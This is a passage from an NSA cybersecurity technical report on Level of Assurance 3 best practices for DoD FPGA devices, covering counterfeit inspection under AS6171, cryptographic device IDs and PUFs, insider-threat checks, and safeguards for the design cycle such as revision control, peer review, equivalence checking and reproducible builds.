The mitigations at LoA3 for this threat rely heavily on the physical inspection of the
parts. This reliance requires the differentiation between counterfeits from the authorized
fabrication facility and counterfeits from an unauthorized fabrication facility as different
types of malicious counterfeits. Physical inspections are more intensive for detection of
a counterfeit device from an authorized fabrication facility.
Commercial (non-malicious) counterfeits, such as re-marked parts, may represent a
reliability risk. Programs with specific reliability requirements should plan for the
appropriate level of testing to verify that their design and components meet those goals.
This document will not provide the details for performing reliability testing as they differ
for each program. The program should perform sampled reliability testing against the
standards claimed by the manufacturer or those needed by the program.
Additionally, at LoA3 there is the assumption of the existence of one or more
compromised cleared insiders in the program and the presumption of an adversary
achieving difficult points of access. The insider(s) may be used by the adversary to
introduce malicious features during any portion of the product manufacturing cycle
and/or compromise a portion of the FPGA device verification process. Compromised
cleared insiders may be used to introduce counterfeit parts into the program supply
chain or to compromise the program
s acceptance testing. Overlapping checks are
therefore necessary for each threat commensurate to this level of assurance.
JFAC relies on substantial physical device inspection to address these threats because
the program has no positive control over the fabrication facility or its processes. Most of
the FPGA fabrication facilities are foreign owned and not controllable by the program or
DoD. JFAC can identify numerous 
technically
 feasible attacks for all fabrication
countermeasures considered. Overlapping personnel and multi-party review in the
verification process along with cryptographically protected IDs and reliability testing of
sampled devices provides additional assurance protections.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Guidelines for conducting physical inspection are provided by the SAE AS6171
counterfeit detection standard. These guidelines are organized into 
slash sheets.
 Each
slash sheet is a description of a singular type of inspection process. For the purposes of
this document, the slash sheets may be divided into several purposes:
Slash sheets 2-10: describe physical inspections able to identify devices that
were manufactured in an unauthorized fab.
Slash sheets 11: describes physical inspections able to identify maliciously
altered devices that were manufactured in an authorized fab.
Slash sheets 3, 4, 6, and 10: describe physical inspections intended to uncover
malicious alterations made to the package internals of an authentic device.
More details regarding the physical inspection process are outlined below in the
mitigations.
TD 2 mitigations
Purchase from DoD authorized vendors and distributors.
Consult GIDEP and follow their guidance on counterfeit risk mitigation, including
guidance on known counterfeit parts. The program should use this information to
inform their physical analysis efforts.
Follow storage and shipping guidance when storing and transferring FPGA
devices between locations.
Verify the FPGA cryptographically secure identifier (ID) against information sent
by the vendor (not the authorized distributor).
Using the latest approved version of AS6171 with associated slash sheets
perform physical inspection/analysis on a sampling of random devices to detect
counterfeit parts.
Mitigate risk of a cleared insider involved in the physical inspection process.
TD 2 mitigation descriptions
Purchase from DoD authorized vendors and distributors
Ensure devices are purchased from vendors and distributors authorized by DoD.
Consult GIDEP
GIDEP provides technical data compiled by government and industry regarding
counterfeit hardware devices to be used for system design, development, production,
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
and logistics support processes. This information contains counterfeit risk mitigations
and physical analysis results.
Follow storage and shipping guidance
The program should document, maintain and enforce both device storage and shipping
procedures. Minimally the plan should enforce the verification of all devices upon
receipt. Once verification has taken place production devices should be stored and
maintained in a restricted area separate from non-production devices (design, test,
etc.). Production devices should be continuously tracked to include arrival of the device
by unique identifier, interaction anyone has with the device, and exit of the device from
inventory. The restricted area should enforce access control that limits access to only a
minimum subset of people that require access to support direct job responsibilities and
excludes all members of the design team. The restricted area should have a clearly
defined perimeter, but physical barriers are not required. Personnel within the area are
responsible for challenging all persons who may lack appropriate access authority. The
restricted area access should be audited to include data containing who entered/exited
the area, with a timestamp and reason for entry.
Shipping should be controlled and managed. JFAC recommends shipping material
using a commercial carrier that has been approved by the CSA to transport Secret
shipments, although the material is not Secret. Commercial carriers may be used only
within and between the 48 contiguous States and the District of Columbia or wholly
within Alaska, Hawaii, Puerto Rico, or a U.S. possession or trust territory. When
shipping using a commercial carrier take efforts to afford additional protection against
pilferage, theft, and compromise as follows. This includes using hardened containers
unless specifically authorized otherwise and ensuring the packages are sealed. The
seals should be numbered and the numbers indicated on all copies of the bill of lading
(BL). When seals are used, the BL shall be annotated substantially as follows: DO NOT
BREAK SEALS EXCEPT IN CASE OF EMERGENCY OR UPON PRIOR AUTHORITY
OF THE CONSIGNOR OR CONSIGNEE. IF FOUND BROKEN OR IF BROKEN FOR
EMERGENCY REASONS, APPLY CARRIER'S SEALS AS SOON AS POSSIBLE AND
IMMEDIATELY NOTIFY BOTH THE CONSIGNOR AND THE CONSIGNEE.
Verify the FPGA cryptographically secure identifier
For LoA3, the program should utilize an FPGA device that incorporates a
cryptographically protected ID that can be verified against information sent by the
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
vendor (not the authorized distributor). The use and verification of this type of device ID
mitigates the counterfeit parts made in an existing, non-authorized fabrication facility
sub-threat.
While the specifics of each FPGA vendor and platform vary, many newer FPGA
platforms contain this type of anti-counterfeiting feature. When these features are
sufficiently secure, such mechanisms provide an extremely cost-effective method to
detect counterfeits both at acquisition and throughout the FPGA device
s lifecycle in a
system. The biggest two advantages of such techniques are the ability to validate a
device remotely and the ability to non-destructively re-evaluate a device at any time.
By contrast to physical anti-counterfeiting techniques, properly implemented
cryptographically secure identifiers do not require destructive analysis for verification. A
typical scheme could validate such a device simply by placing it in a socket. A design
can facilitate access to the identifier through local access, such as a board header, or
remotely. Depending on the exact mitigations selected, this potentially saves two
distinct destructive steps: one at acquisition of the devices and one after assembly of
the PCB.
For device families that do not offer a cryptographically secure ID, a soft physically
unclonable function (PUF) should be used by the program for device authentication
throughout the manufacturing and lifecycle of the device. In this case, a soft PUF is
configured into each device to produce a unique identifier. This ID is then stored in
association with the physical package serial number. The PUF is then removed. It can
be reconfigured into the device at any time to retrieve the ID to validate the authenticity
of the device at any later date. The PUF should be added and the PUF ID recorded
immediately after validating the device lot as authentic. The step can then be repeated
after the component has been out of the control of the program to verify the devices.
The program should not proceed to manufacture or field LoA3 devices without one of
these ID services. Additionally, the PUF code must be protected as critical data in a
Secret level repository with strong access controls. The PUF signature should be
verified before each use with a hash value.
This kind of validation is where details matter. At the same time, each FPGA vendor
offers a unique approach, and each FPGA platform offers a unique variation. In no case
is a fully readable ID acceptable. Instead, these schemes all detail cases where the
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
device possesses a specific private cryptographic key. The device ID in this scheme
can be cloned only if an adversary is able to get access to that private key. Regardless
of the specific platform used, the public keys/identifiers of the devices being
authenticated must be delivered and maintained in a secure way. For delivery, the
vendor must provide this information to the program using a CNSS or NIST approved
authentication algorithm to transmit the data. Examples would be an ECC-signed email
with a verified certificate or an https-based file distribution system using a verified
certificate. Once received, the integrity of that list must be maintained by storing it as
critical data in a Secret level repository with strong access controls.
Remote attestation is an additional advantage enabled by a cryptographically secure ID.
While remote attestation cannot be used during acquisition and assembly due to the
potential introduction of additional vulnerabilities, it can be used throughout the rest of
the lifecycle of the device. This provides the possibility of a future where devices and
their configurations can be validated and monitored remotely. Capabilities for remote
attestation of hardware, firmware, and software are currently being developed in the
cybersecurity space as enterprise management tools. While their use is not yet fully
widespread in hardware development, inclusion of these features is a potential growth
area for the lifecycle hardware assurance of FPGA devices.
Remote attestation is a powerful and valuable technique and JFAC can consult on
appropriate remote attestation schemes, potentially based on these same mechanisms.
However, the initial counterfeit screening must be done locally, validating each specific
device.
This section describes at the highest level the specific criteria that is required for an
appropriate device ID to support anti-counterfeiting.
Cryptographically protected IDs must utilize a CNSS Policy compliant private
asymmetric key for which no read function exists. If CNSS is not a program
requirement, the program should use a CNSS or NIST approved asymmetric
authentication algorithm.
The provenance of the key must be understood in detail.
The device must be able to authenticate a nonce using this key. Each device
s ID must
be authenticated by the public vendor-provided key through decryption of the nonce.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Perform physical inspection/analysis
Perform physical analysis on a sampling of random devices to detect counterfeit parts.
This analysis applies specific, industry standard counterfeit inspection techniques,
including package analysis, x-ray of the part, and examination of the die with
comparisons against FPGA vendor provided golden samples. This physical analysis is
intended to catch parts that have been remarked or contain counterfeit die. The details
of what steps to conduct in the analysis and recommendations on how to execute them
are contained in the commercial standard document, SAE AS6171. To reduce
personnel threats, these inspections should be carried out by cleared personnel at a
Secret level or higher.
At LoA2 and LoA3, there are additional attacks introduced under the counterfeit threat:
Insertion of a malicious function into the package of an authentic device
Counterfeit parts made in an authorized fabrication facility
It is due to these new threats that physical inspection is required in all cases. In LoA1,
cryptographically secure IDs were sufficient to address the counterfeit threat. However,
this would not be sufficient at LoA2 or LoA3 since these IDs would not preclude the
insertion of a malicious function into the package of a device nor identify devices where
malicious features were added to the die during manufacturing.
Physical analysis is a sequence of device analysis steps, from least destructive to most
destructive, designed to ensure that the part in question is authentic. If a device fails a
given step, it is not authentic and there is no need to complete further steps. If all steps
are completed and the device passes, it is likely authentic, with likelihood
commensurate with the amount of effort it would take to get a counterfeit device to pass
these tests, and the fact that the device in question is subject to LoA3. Each AS6171
test is detailed in a separate document called a 
slash sheet
. Listed below are the slash
sheets that comprise the standard.
Table 2: List of AS6171 slash sheets
Test Number
Description
AS6171
Test Methods Standard; General Requirements,
Suspect/Counterfeit, Electrical, Electronic, and Electromechanical
Parts
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Test Number
Description
AS6171/1
Suspect/Counterfeit Test Evaluation Method
AS6171/2
Techniques for Suspect/Counterfeit EEE Parts Detection by
External Visual Inspection, Remarking and Resurfacing, and
Surface Texture Analysis Test Methods
AS6171/3
Techniques for Suspect/Counterfeit EEE Parts Detection by X-ray
Fluorescence Test Methods
AS6171/4
Techniques for Suspect/Counterfeit EEE Parts Detection by
Delid/Decapsulation Physical Analysis Test Methods
AS6171/5
Techniques for Suspect/Counterfeit EEE Parts Detection by
Radiological Test Methods
AS6171/6
Techniques for Suspect/Counterfeit EEE Parts Detection by
Acoustic Microscopy (AM) Test Methods
AS6171/7
Techniques for Suspect/Counterfeit EEE Parts Detection by
Electrical Test Methods
AS6171/8
Techniques for Suspect/Counterfeit EEE Parts Detection by
Raman Spectroscopy Test Methods
AS6171/9
Techniques for Suspect/Counterfeit EEE Parts Detection by
Fourier Transform Infrared Spectroscopy (FTIR) Test Methods
AS6171/10
Techniques for Suspect/Counterfeit EEE Parts Detection by
Thermogravimetric Analysis (TGA) Test Methods
AS6171/11
Techniques for Suspect/Counterfeit EEE Parts Detection by
Design Recovery Test Methods
For the purposes of LoA3, the program should follow the lot sampling guidelines found
in the latest version of AS6171 and exercise the tests defined by slash sheets 1-11.
Sheets 1-10 should uncover a counterfeit fabricated in an unauthorized fabrication
facility or a malicious package insert. Sheet 11 should uncover a counterfeit fabricated
in the authorized fabrication facility.
Here are the physical analysis steps that should be taken:
If the device family possesses cryptographically protected IDs:
 Perform slash sheets 2 and 3 that incorporate visual inspection and 3D xray. This effort focuses on analyzing the parts for a malicious additive
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
inserted inside the package. The number of parts sampled should be
guided by the sampling standard found in slash sheet 1.
If the device family does not possess cryptographically protected IDs:
 Perform slash sheets 2-10 for the purposes of detecting an in-package
malicious insert and a die manufactured in an unauthorized facility.
 Perform the steps outlined below as they relate to slash sheet 11 to
identify malicious functions added to the die during manufacture in an
authorized facility. This test may be limited to a single device.
Sheet 11 is a set of instructions for performing a full delayering, imaging of die, and
comparison against the vendor provided GDSII or an exemplar device. This analysis
exposes the FPGA die manufactured layers for comparison against a golden model
made up of either vendor provided images/GDSII or an exemplar part. An exemplar part
is one that is obtained directly from the vendor and not from an authorized distributor.
For LoA3, the program must perform the following reverse engineering comparison on a
single part:
Full chip delayering 
 imaging and comparison of all layers to the exemplar when the
state of the art capability allows it. This is the ideal option for detecting malicious
changes. In the case of FPGA multi-chip modules (MCM), all the dies should be
examined using this technique. Special care should be taken to validate the internal
packaging connections.
Full backside delayering 
 imaging and comparison of layers active, poly, contact, and
metal 1 (M1). This is the ideal option for detecting malicious changes when a state-ofthe-art lab capability is not sufficient. In the case of FPGA multi-chip modules (MCM), all
the dies should be examined using this technique. Special care should be taken to
validate the internal packaging connections.
Forward the results of the examination to JFAC with information regarding the FPGA
type and lot. The results should include a description of the verification method and the
coordinates of the windows opened for evaluation. JFAC will compile this information
over time to develop better insight into malicious attacks on the manufacturing process.
Contact JFAC for guidance when process geometries are beyond the state-of-the-art
in reverse engineering.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Reliability testing should be conducted on sampled parts using the same sampling
guidelines provided by SAE AS6171. This testing should ensure that the devices meet
the reliability requirements of the program. Do not assume compliance based upon
device datasheet information.
Cleared insider
To mitigate the risk of a cleared insider compromising the physical analysis process,
programs should:
Select sample parts bound for physical inspection in ways that specifically defeat
insider compromise.
Create cryptographically protected IDs post verification.
*Verify independent lab work using overlapping personnel and multi-party review.
Follow the mitigation guidance in TD 4: Adversary compromises system
assembly, keying, or provisioning.
Select sample parts
The selection of parts to be physically sampled must be handled in such a way that a
compromised cleared insider could not just select good parts to be sampled. Possible
options include the following:
Multiple independent parties handle part selection before shipping, and they
should physically verify that the parts selected make it all the way to the physical
inspection processes.
An independent party verifies sampling before shipping, and multiple parties
verify upon receipt that the right parts were received.
Use a non-human random selection automated process for sampling.
All physical verification and sampling work should be conducted by personnel
holding clearances of at least the Secret level and carried out in facilities cleared
to at least the Secret level.
Create cryptographically protected IDs post verification
Following physical verification above, JFAC recommends using soft PUFs to protect the
authentic parts from being swapped out for modified devices during the subsequent
program manufacturing process:
Load the soft PUF into the fabric and generate a unique ID for the FPGA die.
Record the device serial number and PUF ID.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Erase the soft PUF.
At any time during the lifecycle of the FPGA device, the soft PUF can be reloaded and
the unique ID can be extracted and compared against the expected value for
confirmation of the authenticity of the part.
Verify independent lab work
There is a need to check the lab performing the physical verification for compromised
results. If a compromised program insider is working with a compromised lab to pass
counterfeit parts off as good, the compromised lab could throw away all the devices
submitted for examination and simply create reports and photos of an exemplary
device, or they could do all the work but falsify the reports.
This threat is not completely mitigated with the following steps, but these steps increase
the difficulty of returning false reports:
Insist on the return of sampled materials and detailed reports after evaluation.
This serves as a check that the lab did the work and serves as an additional
means to verify that sampling guidelines were followed.
Require lock and key storage of all parts to be physically inspected and whether
that inspection is done by the program or by independent lab(s).
Additionally, choose one of the following:
Option 1: Insert known bad parts into the samples to be physically verified. Track which
parts those are using custom bad data and/or markings. If the independent lab does not
report those parts as bad, then either they, or who they are reporting bad parts to, or
both, may be compromised.
Option 2: Use two labs, use an independent expert observer, or both. This creates a
check against the lab being compromised.
Option 3: Perform any physical inspections done by the program, rather than an
independent lab, with two-person authentication, or duplicate them independently, or
both.
TD 3: Adversary compromises application design cycle
In this threat, a compromised insider has access to the design process and data related
to an FPGA application development effort. This insider can use their access to modify
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
design code or design constraints, change FPGA configuration settings, or swap in a
distinct configuration file that is authenticated and built with the same tools and keys
being used by the design team. The actor is in a particularly advantageous position
because they can modify the product during any phase of the design process. This
same threat surface may also be attacked via remote network intrusion. An attacker
with network access may also be able to modify important design data in a way that
introduces a Trojan or other nefarious functions.
At LoA3, it is assumed that multiple cleared and uncleared individuals may be the
adversarial actor. The uncleared people can have different positions within the supply
chain. The actors could be working independently or with each other. In this threat the
compromised insider has access to the design process and data related to an FPGA
application development effort.
TD 3 is comprised of several specific scenarios. These scenarios describe the entire
threat at TD 3 and each of the mitigations for each scenario should be implemented.
The specific scenarios are as follows:
Introduction of a compromised design into the application,
Modification of test benches or plans to reduce coverage or hide Trojan code,
Introduction of a Trojan into the application design during development,
Introduction of compromised tooling or software into the environment,
Intrusion into the internal network,
Compromised employee,
Modification of the revision control system to hide malicious code or test bench
modifications (associated mitigations are captured in the 
in all cases
 section
below),
Introduction of modified configuration data after generation (associated
mitigations are captured in the 
in all cases
 section below),
Compromise of device identifiers.
TD 3 mitigations
The best practices presented here do not constitute a standalone FPGA design flow,
but rather should be integrated into the existing design procedures. These assurance
practices incorporate industry accepted design best practices with emphasis on
documented and approved design, review, and test procedures.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
The following set of mitigations apply to all TD3 scenarios, in addition to mitigations
identified in the individual scenario sections.
In all cases mitigations
Use Secret level cleared personnel. If the program has higher level clearance
requirements, the program
s requirement should be followed.
Track critical data in a revision control system.
Enforce auditability of the requirements, architecture, design, code, tests, bugs,
and fixes.
Use revision control/version management that meets the requirements described
later in this section.
Descriptions
Use Secret level cleared personnel
Use personnel with at least a Secret level clearance to perform designated work
Track critical data in a revision control system
The program should identify and document all data that is considered critical. Each
critical data item should be stored and tracked in the revision control system. Minimally,
the following documents, data artifacts, and tool configurations should be managed in
the revision control system:
Third-party IP (3PIP)
Utilized libraries
Development files, code, software used for development, synthesis scripts, and
tools
Test benches, test plans, test procedures, and test reports
Tool configuration settings
Design documents
Enforce auditability
Enforce auditability of the requirements, architecture, design, code, tests, bugs, and
fixes. At a minimum, audit data should include what decisions were made, by whom, for
what reason, and on what date.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Use revision control/version management
Revision control/version management systems should meet the following requirements:
Allow only authorized system administrators to make changes to the underlying
revision control tool and underlying server.
Implement a backup system that mimics the primary system and is maintained by
a separate administrator. Separate system administrators should manage each
system.
Enforce administrative restrictions; restrict privileged access to authorized
personnel only; limit what users can do to the database; ensure all users are
verified; encrypt database information
both in transit and at rest; enforce secure
passwords; enforce role-based access control and privileges; and remove
unused accounts.
Remove any components or functions that are not needed; for example, remove
all sample files and default passwords.
Ensure the system provides a complete and immutable long-term change history
of every file. The system must log every change made by individuals. This
includes creation and deletion of files and content edits. The history must include
the person who made the change, what was changed, the date, and written
notes on the purpose of each change.
Ensure the system stores a reliable copy of assets that are currently in
production.
Ensure the system stores reliable copies of previous production versions of
assets, allowing for the complete retrieval of those versions.
Enforce password best practices (password rotation, length, etc.). In lieu of a
password, two-factor authentication can be used.
TD 3.1 Mitigating the introduction of a compromised design into the
application
In this scenario, the adversary is able to insert a Trojan into the design after the design
has been verified, but before the design is loaded for final deployment. Strict controls on
the revision control system will help prevent the adversary from making unmonitored
changes.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
To accomplish this task the adversary would have to compromise the revision control
system. That compromise could allow the adversary to change the verified configuration
files, settings, hash, or other pertinent information. To protect against this, the program
should store and isolate the verified configuration files, settings, and associated hashes.
Before the design is loaded for final deployment, the program should verify the hash to
ensure that the verified version is the same as what they are going to deploy. For extra
assurance, the program has all the necessary data to reproduce the build and can verify
the stored version against the reproduced version.
Mitigations
Physically isolate and store the application design until it is delivered.
Perform reproducible build of the application.
Descriptions
Isolate and store the application design
To protect the application design after verification but before deployment, the final
configuration file and hash should be physically isolated and stored until it is delivered
for provisioning. Ensure the file can only be accessed via authentication of two distinct
parties. No single individual should be able to access the file. The limited set of people
with access should have to follow access control procedures such that access is
controlled, monitored, logged, and auditable.
Perform reproducible build
Use a reproducible build process to verify the integrity of the FPGA synthesis and build
software. The reproducible build performs the synthesis process that takes in human
readable HDL, and other human readable inputs, and consistently generates the same
final configuration file (bitstream). It is expected that this process will, in most cases,
require the use of the same version of the Electronic Design Automation (EDA) tools,
and in some cases the same operating system version. This process will highlight the
possession of modified software where there is a mismatch. Contact the FPGA software
vendors or JFAC for more information on how to perform reproducible builds.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
TD 3.2 Mitigating the modification of test benches or plans to reduce
coverage or hide Trojan code
In this threat, the adversary makes changes to the test bench to hide malicious code,
reduce coverage or reduce functionality.
Mitigations
Create and execute a documented test plan that identifies the various test
reviews that will take place, analysis to be performed, type of testing to be
performed, and the methods used to accomplish the test.
Validate and verify test processes which include design/test team separation,
peer reviews, and use of automated tools where applicable.
Maintain test environment via configuration management as a critical system.
Descriptions
Execute a documented test plan
The program should consider assurance when creating and maintaining the test plan.
The test plan and processes should at least:
Provide a mechanism to verify all the requirements captured in the FPGA
application specification.
Explicitly list code coverage metrics, the type of testing that will be performed,
and acceptable testing guidelines. Code coverage should state how much code
is checked by the test bench, providing information about dead code in the
design and holes in the test suites. Document the decision to use/not use other
types of testing, such as directed test, constrained random stimulus, and
assertion.
Ensure code coverage includes statement coverage, branch coverage, Finite
State Machine (FSM), condition, expression, and toggle coverage. Document
any code that will not be covered and why. Ensure untested code is documented
and reviewed through the review process. Use functional tests to verify the FPGA
does what it is supposed to do. Any deviations must be documented and
approved.
Specify the verification environment which describes the tools, the software, and
the equipment needed to perform the reviews, analysis, and tests. Each of these
items should be maintained under revision control.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Document and analyze unexpected behavior and final implementation
conclusions.
Ensure all test discrepancies, bugs, etc., are resolved via a change process.
Validate and verify the test processes
The program should take care to ensure test processes consider assurance needs. This
includes design/test team separation, peer reviews, and use of automated tools where
applicable. All test discrepancies, bugs, etc., should be resolved via a change process
utilizing a change management system. The established processes should be
documented, enforced, and audited.
Maintain test environment via configuration management
The test environment should be treated as a critical system and maintained similarly to
the production environment.
TD 3.3 Mitigating the introduction of a Trojan into the application
design during development
In this scenario, malicious functionality is introduced into the application design during
the development phase.
Mitigations
Maintain bi-directional links to approved requirements. Tracing to design
decisions is permitted in support of derived requirements.
Enforce peer review best practices.
Create and execute a documented test plan.
Implement, validate, and verify test processes which include design/test team
separation, peer reviews, and use of automated tools where applicable.
Select a formal 
proof
 process that can validate the equivalency of the HDL and
the final configuration file. For more information on 
proof
 tools, contact JFAC.
Descriptions
Maintain bi-directional links to approved requirements
All requirements should be documented and traced. Functionality that is not associated
with a requirement should not be allowed.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Enforce peer review
Establish and enforce peer review processes with the following characteristics:
The author and the reviewer must be different people.
Ensure the design process has time allocated for code reviews.
Code review should be done in parallel with development, reviewing small
chunks at a time.
Anyone reviewing the code should already be familiar with the approved
architecture.
All black box portions of the design must be identified, justified, and approved.
All scripts that produce design artifacts (HDL, Netlist, etc.) must be reviewed and
approved. Ensure there are no unexpected paths, filenames, or suppressed
outputs.
Ensure the code reviews, at a minimum, verify:
 The code does what it is intended to do.
 The code can be traced to requirements.
 The code is not needlessly complex.
 Coding standards are being utilized.
 No extraneous code exists: the developer is not implementing unapproved
items that may have future utility.
 The code has appropriate unit tests.
 Tests are well designed.
 The developer used clear names for everything.
 Comments are clear and useful and mostly explain 
 instead of
what
Execute a documented test plan
The program should consider assurance when creating and maintaining the test plan.
The test plan and processes should at least:
Provide a mechanism to verify all requirements captured in the FPGA application
specification.
Explicitly list code coverage metrics, the type of testing that will be performed,
and acceptable testing guidelines. Code coverage should state how much code
is checked by the test bench, providing information about dead code in the
design and holes in the test suites. Document the decision to use/not use other
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
types of testing such as directed test, constrained random stimulus, and
assertion.
Specify the verification environment which describes the tools, the software, and
the equipment needed to perform the reviews, analysis, and tests. Each of these
items should be maintained under revision control.
Document and analyze unexpected behavior and final implementation
conclusions.
Ensure code coverage includes statement coverage, branch coverage, FSM,
condition, expression, and toggle coverage. Document any code that will not be
covered and why. Ensure untested code is documented and reviewed through
the review process. Use functional tests to verify the FPGA does what it is
supposed to do. Any deviations must be documented and approved.
Ensure all test discrepancies, bugs, etc., are resolved via a change process.
Implement, validate, and verify test processes
The program should take care to ensure test processes consider assurance needs. This
includes design/test team separation, peer reviews, and use of automated tools where
applicable. All test discrepancies, bugs, etc., should be resolved via a change process
utilizing a change management system. The established processes should be
documented, enforced and audited
Select a formal 
proof
 process
Use logical equivalency checking to the greatest extent possible. Equivalency checking
is used to prove the tools did not modify the logic or configuration settings. To do this
the final bitstream is compared to the originating application HDL to demonstrate they
are logically equivalent with no extraneous logic in the final format. This approach
confirms Trojans were not inserted during the implementation steps. This check also
confirms configuration settings are maintained and not altered. Configuration settings
are those parameters included in the configuration file that affect the behavior of the
FPGA device itself, but are not a part of the program application. Examples would
include tamper settings, Joint Test Action Group (JTAG) settings, and key storage.
There are technical challenges associated with performing logical equivalency checking
(LEC) on FPGA data. Contact JFAC for information on emerging industry tools that can
assist in identifying configuration data in the FPGA formats or automate the creation of
hints files.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
TD 3.4 Mitigating the introduction of compromised tooling or software
into the environment
In this scenario, the adversary introduces compromised tooling or software into the
environment. This can be accomplished by an insider or through network intrusion.
Mitigations
Validate cryptographic hashes against hashes signed by the vendor.
*Research vulnerabilities affecting tools/platforms using commercial and JFAC
provided resources. If vulnerabilities are found, use an alternate or newer version
that does not have the vulnerability. Alternatively, perform a risk assessment and
coordinate findings with JFAC.
*Validate tools.
Validate cryptographic hashes
All parts of the software delivery should be authenticated by comparing the
cryptographic hash of all received software against the hash signed by the vendor. This
includes 
install
 macros and other support functions. Only accept certificates validated
by reputable third parties. Only accept publicly released software and document the
source of the hash signature and the hash itself.
Research vulnerabilities
Software and tooling vulnerabilities can be exploited for nefarious purposes. The
program should actively monitor for vulnerabilities and perform risk assessment for any
software or tools selected. Platforms and tool vulnerabilities can be found in databases
such as:
Common Vulnerabilities and Exposures (CVE) 
 https://cve.mitre.org
National Vulnerabilities Database (NVD) 
 https://nvd.nist.gov
Government Industry Data Exchange Program (GIDEP) 
https://www.gidep.org/products/products.htm
DISA Security Technical Implementation Guides (STIGs) 
https://public.cyber.mil/stigs/
Searches for vendor advisories, publications and academic papers detailing
vulnerabilities in the device in question.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Contact the vendor technical representative for unreleased or pre-release
vulnerability reports.
If vulnerabilities are found in the software of tools
If vulnerabilities are found in the software or tools, choose one of the following options:
Option 1: Select a different tool or software that does not have published vulnerabilities
and meets the program requirements.
Option 2: Use standard formal processes and procedures to work with the vendor to
resolve the vulnerability. Once a fix is identified, accept only formal releases and do not
accept custom beta fixes, custom patches, etc., for incorporation; or
Option 3: Internally determine the vulnerability poses no significant risk to the program.
Note: If a vulnerability is identified, it is recommended to report it to the Government
Industry Data Exchange Program (GIDEP) and to contact the vendor so they may
correct it.
Validate tools
Validate that the tool delivers the expected output by selecting from one of the options
below:
Option 1: Select a formal 
proof
 process that can validate the equivalency of the HDL
and final configuration file.
Option 2: Use a reproducible build process to generate any deployable configuration
files, AND acquire EDA tools from at least two different distributors.
Use a formal 
proof
 process
Use logical equivalency checking (LEC) to the greatest extent possible. LEC is used to
prove the tools did not modify the logic or configuration settings. To do this, the final
bitstream is compared to the originating application HDL to demonstrate they are
logically equivalent with no extraneous logic in the final format. This approach confirms
Trojans were not inserted during the implementation steps. This check also confirms
configuration settings are maintained and not altered. Configuration settings are those
parameters included in the configuration file that affect the behavior of the FPGA device
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
itself, but are not a part of the program application. Examples would include tamper
settings, JTAG settings, and key storage.
There are technical challenges associated with performing LEC on FPGA data. Contact
JFAC for information on emerging industry tools that can assist in identifying
configuration data in the FPGA formats or automate the creation of hints files.
Use a reproducible build process
A reproducible build process is a methodology to verify the integrity of the FPGA
synthesis and build software. A reproducible build performs the synthesis process
taking in human readable HDL, and other human readable inputs, and consistently
generates the same final configuration file (bitstream).
Acquire EDA tools from at least two different distributors
At LoA3, reproducible builds should be performed using independently acquired
software and installed independently on two distinct computers. It is expected that this
process will, in most cases, require the use of the same version of the EDA tools, and in
some cases the same operating system version. This process will highlight the
possession of modified software where there is a mismatch. Contact the FPGA software
vendors for more information on how to perform reproducible builds.
TD 3.5 Mitigating intrusion into the internal network
In this scenario, an adversary gains access to the internal network. With this access, the
adversary can employ multiple methods to achieve nefarious goals, such as making
modifications to tools, swapping files, etc.
Mitigations
Assign roles.
Control and monitor access, including physical and logical restrictions.
Periodically research vulnerabilities using commercial and JFAC provided
information. If vulnerabilities are found, use an alternate or newer version that
does not have the vulnerability. Alternatively, perform a risk assessment and
